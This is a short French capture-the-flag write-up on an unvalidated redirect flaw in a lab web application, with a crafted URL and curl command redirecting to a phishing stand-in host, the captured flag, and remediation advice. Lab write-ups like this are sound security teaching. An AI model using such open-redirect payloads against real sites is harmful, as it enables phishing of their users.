# Unvalidated redirection

## Exploitation

Sur le bas de page on peux voir les redirections vers twitter - facebook - instagram.
On peux changer ces redirections en inspectant le code de la page ou directement dans l'url puisque la redirection est une requete GET 

Un exemple de redirection vers http://phishing.com :

```text
http://192.168.122.55/index.php?page=redirect&site=http://phishing.com
```

avec curl :

```bash
$> curl http://192.168.99.100/index.php\?page\=redirect\&site\=http://phishing.com | grep flag

Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
```

## Resolution 

Le moyen le plus simple et le plus efficace d'empêcher les redirections vulnérables serait de ne pas laisser l'utilisateur contrôler où votre page les redirige. Si vous devez rediriger l'utilisateur en fonction des URL, au lieu d'utiliser des entrées non fiables, vous devez toujours utiliser un ID qui est résolu en interne vers l'URL respective. Si vous souhaitez que l'utilisateur puisse émettre des redirections, vous devez utiliser une page de redirection qui oblige l'utilisateur à cliquer sur le lien au lieu de simplement les rediriger. Vous devez également vérifier que l'URL commence par http: // ou https: // et également invalider toutes les autres URL pour empêcher l'utilisation d'URI malveillants tels que javascript.
